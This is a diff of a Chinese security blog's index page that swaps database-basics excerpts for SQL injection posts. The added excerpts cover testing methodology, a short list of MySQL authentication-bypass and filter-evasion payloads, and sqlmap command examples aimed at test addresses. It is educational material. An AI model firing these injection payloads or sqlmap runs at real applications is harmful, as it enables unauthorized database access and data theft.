@@ -235,8 +235,8 @@
             
               
                 
-                <a class="post-title-link" href="/db_sql4.html" itemprop="url">
-                  Db - 数据库基本操作(四):数据类型
+                <a class="post-title-link" href="/anquan_sqlinj22.html" itemprop="url">
+                  Sql注入攻击与防御总结：第2章 SQL注入测试
                 </a>
               
             
@@ -249,8 +249,8 @@
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2010-02-04T00:00:00+08:00" content="2010-02-04">
-              2010-02-04
+            <time itemprop="dateCreated" datetime="2011-06-16T00:00:00+08:00" content="2011-06-16">
+              2011-06-16
             </time>
           </span>
 
@@ -263,8 +263,8 @@
               <span class="post-meta-item-text">分类于</span>
               
                 <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/Db/" itemprop="url" rel="index">
-                    <span itemprop="name">Db</span>
+                  <a href="/categories/安全/" itemprop="url" rel="index">
+                    <span itemprop="name">安全</span>
                   </a>
                 </span>
 
@@ -279,8 +279,8 @@
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/db_sql4.html#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="db_sql4.html" itemprop="commentsCount"></span>
+                <a href="/anquan_sqlinj22.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="anquan_sqlinj22.html" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -290,7 +290,7 @@
 
           
           
-             <span id="/db_sql4.html" class="leancloud_visitors" data-flag-title="Db - 数据库基本操作(四):数据类型">
+             <span id="/anquan_sqlinj22.html" class="leancloud_visitors" data-flag-title="Sql注入攻击与防御总结：第2章 SQL注入测试">
                &nbsp; | &nbsp;
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -313,63 +313,39 @@
 
       
         
-          <p>Text类型</p>
-<table>
-<thead>
-<tr>
-<th>数据类型</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>CHAR</td>
-<td>保存固定长度的字符串（可包含字母、数字以及特殊字符）。在括号中指定字符串的长度。最多 255 个字符</td>
-</tr>
-<tr>
-<td>VARCHAR</td>
-<td>保存可变长度的字符串（可包含字母、数字以及特殊字符）。在括号中指定字符串的最大长度。最多 255 个字符</td>
-</tr>
-<tr>
-<td>TINYTEXT</td>
-<td>存放最大长度为 255 个字符的字符串</td>
-</tr>
-<tr>
-<td>TEXT</td>
-<td>存放最大长度为 65,535 个字符的字符串</td>
-</tr>
-<tr>
-<td>BLOB</td>
-<td>用于 BLOBs (Binary Large OBjects)。存放最多 65,535 字节的数据</td>
-</tr>
-<tr>
-<td>MEDIUMTEXT</td>
-<td>存放最大长度为 16,777,215 个字符的字符串</td>
-</tr>
-<tr>
-<td>MEDIUMBLOB</td>
-<td>用于 BLOBs (Binary Large OBjects)。存放最多 16,777,215 字节的数据</td>
-</tr>
-<tr>
-<td>LONGTEXT</td>
-<td>存放最大长度为 4,294,967,295 个字符的字符串</td>
-</tr>
-<tr>
-<td>LONGBLOB</td>
-<td>用于 BLOBs (Binary Large OBjects)。存放最多 4,294,967,295 字节的数据</td>
-</tr>
-<tr>
-<td>ENUM</td>
-<td>允许你输入可能值的列表。可以在 ENUM 列表中列出最大 65535 个值。如果列表中不存在插入的值，则插入空值</td>
-</tr>
-<tr>
-<td>SET</td>
-<td>与 ENUM 类似，SET 最多只能包含 64 个列表项，不过 SET 可存储一个以上的值</td>
-</tr>
-</tbody>
-</table>
+          <ol>
+<li><p>借助推理进行测试</p>
+<p>识别sql注入的简单规则：</p>
+<ul>
+<li><p>识别web应用上所有的数据输入</p>
+<ol>
+<li>get请求&amp;post请求</li>
+<li>操纵参数</li>
+<li>信息工作流 (请求到web服务器再到数据库让后将信息返回的流程)</li>
+</ol>
+</li>
+<li><p>了解那种类型的请求会触发异常</p>
+<p>数据库触发错误时候的场景</p>
+<ul>
+<li>将sql错误显示在页面上，它对web浏览器用户可见</li>
+<li>将sql错误隐藏在web页面的源代码中以便调试</li>
+<li>检测到错误时跳转到另一个页面</li>
+<li>返回Http错误码500或重定向码302</li>
+</ul>
+</li>
+<li><p>检测服务器响应中的异常</p>
+<ul>
+<li>常见错误页面</li>
+<li>http代码错误</li>
+<li>不同大小的响应</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<p>
           <div class="post-more-link text-center">
-            <a class="btn" href="/db_sql4.html#more" rel="contents">
+            <a class="btn" href="/anquan_sqlinj22.html#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -420,8 +396,8 @@
             
               
                 
-                <a class="post-title-link" href="/db_sql3.html" itemprop="url">
-                  Db - 数据库基本操作(三):函数
+                <a class="post-title-link" href="/anquan_sqlinj21.html" itemprop="url">
+                  Sql注入攻击与防御总结：第1章 什么是SQL注入
                 </a>
               
             
@@ -434,8 +410,8 @@
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2010-01-27T00:00:00+08:00" content="2010-01-27">
-              2010-01-27
+            <time itemprop="dateCreated" datetime="2011-05-19T00:00:00+08:00" content="2011-05-19">
+              2011-05-19
             </time>
           </span>
 
@@ -448,8 +424,8 @@
               <span class="post-meta-item-text">分类于</span>
               
                 <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/Db/" itemprop="url" rel="index">
-                    <span itemprop="name">Db</span>
+                  <a href="/categories/安全/" itemprop="url" rel="index">
+                    <span itemprop="name">安全</span>
                   </a>
                 </span>
 
@@ -464,8 +440,8 @@
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/db_sql3.html#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="db_sql3.html" itemprop="commentsCount"></span>
+                <a href="/anquan_sqlinj21.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="anquan_sqlinj21.html" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -475,7 +451,7 @@
 
           
           
-             <span id="/db_sql3.html" class="leancloud_visitors" data-flag-title="Db - 数据库基本操作(三):函数">
+             <span id="/anquan_sqlinj21.html" class="leancloud_visitors" data-flag-title="Sql注入攻击与防御总结：第1章 什么是SQL注入">
                &nbsp; | &nbsp;
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -498,52 +474,13 @@
 
       
         
-          
-            <p>内建的SQL函数的语法是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select function(列) from 表</div></pre></td></tr></table></figure></p>
-<table>
-<thead>
-<tr>
-<th>函数</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>avg(column)</td>
-<td>返回某列的平均值</td>
-</tr>
-<tr>
-<td>count(column)</td>
-<td>返回某列的行数</td>
-</tr>
-<tr>
-<td>count(*)</td>
-<td>返回被选行数</td>
-</tr>
-<tr>
-<td>first(column)</td>
-<td>返回在指定的域中第一个记录的值</td>
-</tr>
-<tr>
-<td>last(column)</td>
-<td>返回在指定的域中最后一个记录的值</td>
-</tr>
-<tr>
-<td>max(column)</td>
-<td>返回某列的最高值</td>
-</tr>
-<tr>
-<td>max(column)</td>
-<td>返回某列的最低值</td>
-</tr>
-<tr>
-<td>sum(column)</td>
-<td>返回某列的总和</td>
-</tr>
-</tbody>
-</table>
-
-          
+          <ol>
+<li><p>概念<br>Sql注入是这样一种漏洞：应用程序在向后台数据库传递sql查询时，如果为攻击者提供了影响该查询的能力，就会引发Sql注入。</p>
+          <div class="post-more-link text-center">
+            <a class="btn" href="/anquan_sqlinj21.html#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
         
       
     </div>
@@ -591,8 +528,8 @@
             
               
                 
-                <a class="post-title-link" href="/db_sql2.html" itemprop="url">
-                  Db - 数据库基本操作(二)
+                <a class="post-title-link" href="/anquan_sqlinjjiqiao.html" itemprop="url">
+                  SQL注入技巧
                 </a>
               
             
@@ -605,8 +542,8 @@
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2010-01-14T00:00:00+08:00" content="2010-01-14">
-              2010-01-14
+            <time itemprop="dateCreated" datetime="2011-04-26T00:00:00+08:00" content="2011-04-26">
+              2011-04-26
             </time>
           </span>
 
@@ -619,8 +556,8 @@
               <span class="post-meta-item-text">分类于</span>
               
                 <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/Db/" itemprop="url" rel="index">
-                    <span itemprop="name">Db</span>
+                  <a href="/categories/安全/" itemprop="url" rel="index">
+                    <span itemprop="name">安全</span>
                   </a>
                 </span>
 
@@ -635,8 +572,8 @@
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/db_sql2.html#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="db_sql2.html" itemprop="commentsCount"></span>
+                <a href="/anquan_sqlinjjiqiao.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="anquan_sqlinjjiqiao.html" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -646,7 +583,7 @@
 
           
           
-             <span id="/db_sql2.html" class="leancloud_visitors" data-flag-title="Db - 数据库基本操作(二)">
+             <span id="/anquan_sqlinjjiqiao.html" class="leancloud_visitors" data-flag-title="SQL注入技巧">
                &nbsp; | &nbsp;
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -669,51 +606,21 @@
 
       
         
-          
-            <p>chengji</p>
-<table>
-<thead>
-<tr>
-<th>id</th>
-<th>name</th>
-<th>age</th>
-<th>class</th>
-<th>score</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>1</td>
-<td>小米</td>
-<td>17</td>
-<td>语文</td>
-<td>99</td>
-</tr>
-<tr>
-<td>2</td>
-<td>小明</td>
-<td>18</td>
-<td>数学</td>
-<td>88</td>
-</tr>
-<tr>
-<td>3</td>
-<td>小李</td>
-<td>17</td>
-<td>体育</td>
-<td>100</td>
-</tr>
-<tr>
-<td>4</td>
-<td>小米</td>
-<td>17</td>
-<td>体育</td>
-<td>55</td>
-</tr>
-</tbody>
-</table>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"># like:用于在where子句中搜索列中的指定模式</div><div class="line">select * from chengji where name like &apos;%米&apos;</div><div class="line"></div><div class="line"># in：在where子句中规定多个值</div><div class="line">select * from chengji where score in (90,91,92,93)</div><div class="line"></div><div class="line"># between</div><div class="line">select * from chengji where score between 60 and 90</div><div class="line"></div><div class="line"># alias</div><div class="line">select * from chegngji as a</div><div class="line"></div><div class="line"># union 合并多个select语句的结果</div><div class="line">SELECT column_name(s) FROM table_name1</div><div class="line">UNION</div><div class="line">SELECT column_name(s) FROM table_name2</div></pre></td></tr></table></figure>
-          
+          <h1 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h1><hr>
+<h1 id="0x01-MYSQl灵活的语法"><a href="#0x01-MYSQl灵活的语法" class="headerlink" title="0x01 MYSQl灵活的语法"></a>0x01 MYSQl灵活的语法</h1><hr>
+<p><strong>1 MySQL语法以及认证绕过</strong></p>
+<p>注释符：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">#， </div><div class="line">-- X(X为任意字符)</div><div class="line">/*(MySQL-5.1)</div><div class="line">;%00</div><div class="line">`</div><div class="line">&apos;or 1=1;%00</div><div class="line">&apos;or 1=1 union select 1,2`&apos;</div><div class="line">&apos;or 1=1 #</div><div class="line">&apos;/*!50000or*/ 1=1 -- -      //版本号为5.1.38时只要小于50138</div><div class="line">&apos;/*!or*/ 1=1 -- -</div></pre></td></tr></table></figure>
+<p>前缀：</p>
+<p>任意混合 <code>+ - ~ !</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;or --+2=- -!!!&apos;2</div></pre></td></tr></table></figure>
+<p>测试后发现<code>and/or</code>后面可以跟上偶数个<code>!、~</code>可以替代空格，也可以混合使用(混合后规律又不同)，and/or前的空格可以省略</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;or- -!!!1=1；</div></pre></td></tr></table></figure>
+          <div class="post-more-link text-center">
+            <a class="btn" href="/anquan_sqlinjjiqiao.html#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
         
       
     </div>
@@ -761,8 +668,8 @@
             
               
                 
-                <a class="post-title-link" href="/db_sql1.html" itemprop="url">
-                  Db - 数据库基本操作(一)
+                <a class="post-title-link" href="/anquan_sqlmappar.html" itemprop="url">
+                  SQLMAP参数解释
                 </a>
               
             
@@ -775,8 +682,8 @@
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2010-01-06T00:00:00+08:00" content="2010-01-06">
-              2010-01-06
+            <time itemprop="dateCreated" datetime="2011-04-11T00:00:00+08:00" content="2011-04-11">
+              2011-04-11
             </time>
           </span>
 
@@ -789,8 +696,8 @@
               <span class="post-meta-item-text">分类于</span>
               
                 <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/Db/" itemprop="url" rel="index">
-                    <span itemprop="name">Db</span>
+                  <a href="/categories/安全/" itemprop="url" rel="index">
+                    <span itemprop="name">安全</span>
                   </a>
                 </span>
 
@@ -805,8 +712,8 @@
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/db_sql1.html#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="db_sql1.html" itemprop="commentsCount"></span>
+                <a href="/anquan_sqlmappar.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="anquan_sqlmappar.html" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -816,7 +723,7 @@
 
           
           
-             <span id="/db_sql1.html" class="leancloud_visitors" data-flag-title="Db - 数据库基本操作(一)">
+             <span id="/anquan_sqlmappar.html" class="leancloud_visitors" data-flag-title="SQLMAP参数解释">
                &nbsp; | &nbsp;
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -839,52 +746,12 @@
 
       
         
-          
-            <p>chengji</p>
-<table>
-<thead>
-<tr>
-<th>id</th>
-<th>name</th>
-<th>age</th>
-<th>class</th>
-<th>score</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>1</td>
-<td>小米</td>
-<td>17</td>
-<td>语文</td>
-<td>99</td>
-</tr>
-<tr>
-<td>2</td>
-<td>小明</td>
-<td>18</td>
-<td>数学</td>
-<td>88</td>
-</tr>
-<tr>
-<td>3</td>
-<td>小李</td>
-<td>17</td>
-<td>体育</td>
-<td>100</td>
-</tr>
-<tr>
-<td>4</td>
-<td>小米</td>
-<td>17</td>
-<td>体育</td>
-<td>55</td>
-</tr>
-</tbody>
-</table>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"># select 列 from 表</div><div class="line">select * from chengji</div><div class="line">select name,score from chengji</div><div class="line"></div><div class="line"># select 去重： select distinct 列 from 表</div><div class="line">select distinct name from chengji</div><div class="line"></div><div class="line"># where子句：select 列 from 表 where 列 运算符 值</div><div class="line">select * from chengji where name = ‘小米’ # 字符串要加引号</div><div class="line">select * from chengji where score &lt; 60</div><div class="line"></div><div class="line"># and 和 or</div><div class="line">select * from chengji where score &gt; 60 and scoure &lt; 90</div><div class="line"></div><div class="line"># order by</div><div class="line">select * from chengji order by scoure </div><div class="line">select * from chengji order by scoure desc # 倒序</div><div class="line"></div><div class="line"># insert: insert into 表 values (值1， 值2，...)</div><div class="line">insert into chengji values (‘小红’，17，‘语文’, 100)</div><div class="line"></div><div class="line"># update: update 表 set 列=新值 where 列=某值</div><div class="line">update chengji set score=60 where id=4</div><div class="line"></div><div class="line"># delete: delete from 表 where 列=值</div><div class="line">delete from table where id=5</div></pre></td></tr></table></figure>
-
-          
+          <p>网上整理的Sqlmap使用技巧，有些来自知名网站，由于语句繁多，整理时可能出现一点点的小错误，还望大家见谅，错误的地方还请大家指出来，会即时改正的。<br>
+          <div class="post-more-link text-center">
+            <a class="btn" href="/anquan_sqlmappar.html#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
         
       
     </div>
@@ -932,8 +799,8 @@
             
               
                 
-                <a class="post-title-link" href="/linux_ubuntuqx.html" itemprop="url">
-                  Linux & Shell - ubuntu14.04 让普通用户拥有执行sudo的权限
+                <a class="post-title-link" href="/anquan_sqlmapdemo.html" itemprop="url">
+                  SQLMAP例子
                 </a>
               
             
@@ -946,8 +813,8 @@
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2009-12-13T00:00:00+08:00" content="2009-12-13">
-              2009-12-13
+            <time itemprop="dateCreated" datetime="2011-03-27T00:00:00+08:00" content="2011-03-27">
+              2011-03-27
             </time>
           </span>
 
@@ -960,8 +827,8 @@
               <span class="post-meta-item-text">分类于</span>
               
                 <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/Linux/" itemprop="url" rel="index">
-                    <span itemprop="name">Linux</span>
+                  <a href="/categories/安全/" itemprop="url" rel="index">
+                    <span itemprop="name">安全</span>
                   </a>
                 </span>
 
@@ -976,8 +843,8 @@
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/linux_ubuntuqx.html#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="linux_ubuntuqx.html" itemprop="commentsCount"></span>
+                <a href="/anquan_sqlmapdemo.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="anquan_sqlmapdemo.html" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -987,7 +854,7 @@
 
           
           
-             <span id="/linux_ubuntuqx.html" class="leancloud_visitors" data-flag-title="Linux & Shell - ubuntu14.04 让普通用户拥有执行sudo的权限">
+             <span id="/anquan_sqlmapdemo.html" class="leancloud_visitors" data-flag-title="SQLMAP例子">
                &nbsp; | &nbsp;
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -1010,19 +877,19 @@
 
       
         
-          
-            <ol>
-<li><p>sudo chmod u+w /etc/sudoers</p>
+          <ol>
+<li><p>使用POST方法提交</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap.py -u &quot;http://192.168.1.1/sqlmap/oracle/post_int.php&quot; --method POST --data &quot;id=1&quot;</div></pre></td></tr></table></figure>
 </li>
-<li><p>编辑sudoers文件<br>vi /etc/sudoers<br>找到这行 root ALL=(ALL) ALL,在他下面添加xxx ALL=(ALL) ALL (这里的xxx是你的用户名)</p>
-<p> ps:这里说下你可以sudoers添加下面四行中任意一条<br> youuser            ALL=(ALL)                ALL<br> %youuser           ALL=(ALL)                ALL<br> youuser            ALL=(ALL)                NOPASSWD: ALL<br> %youuser           ALL=(ALL)                NOPASSWD: ALL</p>
-<p> 第一行:允许用户youuser执行sudo命令(需要输入密码).<br> 第二行:允许用户组youuser里面的用户执行sudo命令(需要输入密码).<br> 第三行:允许用户youuser执行sudo命令,并且在执行的时候不输入密码.<br> 第四行:允许用户组youuser里面的用户执行sudo命令,并且在执行的时候不输入密码.</p>
-</li>
-<li><p>sudo chmod u-w /etc/sudoers</p>
+<li><p>使用COOKIES方式提交,cookie的值用;分割,可以使用TamperData来抓cookies</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -u &quot;http://192.168.1.1/sqlmap/mssql/cookie_int.php&quot; --cookie &quot;id=1&quot; -v 1</div></pre></td></tr></table></figure>
 </li>
 </ol>
-
-          
+          <div class="post-more-link text-center">
+            <a class="btn" href="/anquan_sqlmapdemo.html#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
         
       
     </div>
@@ -1053,7 +920,7 @@
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/14/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><span class="page-number current">15</span><a class="page-number" href="/page/16/">16</a><span class="space">&hellip;</span><a class="page-number" href="/page/20/">20</a><a class="extend next" rel="next" href="/page/16/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" href="/page/14/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><span class="page-number current">15</span><a class="page-number" href="/page/16/">16</a><span class="space">&hellip;</span><a class="page-number" href="/page/27/">27</a><a class="extend next" rel="next" href="/page/16/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -1094,7 +961,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">99</span>
+              <span class="site-state-item-count">132</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -1111,7 +978,7 @@
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">29</span>
+                <span class="site-state-item-count">31</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
